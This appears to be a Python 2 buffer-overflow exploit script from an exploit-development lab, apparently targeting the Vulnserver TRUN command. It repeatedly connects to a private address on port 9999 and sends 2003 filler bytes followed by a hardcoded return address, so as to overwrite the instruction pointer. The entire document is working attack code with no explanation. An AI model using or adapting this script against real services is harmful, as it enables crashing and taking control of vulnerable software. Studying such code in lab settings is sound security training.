#!/usr/bin/python
import sys, socket
from time import sleep

shellcode =  "A" * 2003 + "\xaf\x11\x50\x62"

while True:
    try:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(('192.168.126.10',9999))

        s.send(('TRUN /.:/' + shellcode))
        s.close()

    except:
        print "Error connecting to server" 
        sys.exit()
